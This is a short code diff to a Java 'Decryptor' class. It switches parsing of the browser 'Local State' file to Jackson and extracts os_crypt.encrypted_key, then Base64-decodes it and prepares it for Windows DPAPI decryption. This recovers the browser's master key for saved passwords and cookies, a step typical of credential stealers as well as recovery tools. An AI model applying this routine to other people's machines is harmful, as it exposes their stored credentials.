@@ -11,6 +11,7 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
+import com.fasterxml.jackson.databind.JsonNode;
 import com.sun.jna.platform.win32.Crypt32Util;
 
 public class Decryptor {
@@ -61,9 +62,8 @@ public class Decryptor {
 
     public static byte[] getAESKey(String path) {
         try {
-            Json localState = new Json(Paths.get(path, "Local State"));
-
-            String encodedAESKey = localState.valueOf("encrypted_key");
+            JsonNode localState = Json.getObjectMapper().readTree(Paths.get(path, "Local State").toFile());
+            String encodedAESKey = localState.path("os_crypt").path("encrypted_key").asText();
             byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
             byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, DPAPI_OFFSET, decodedAESKey.length);
 
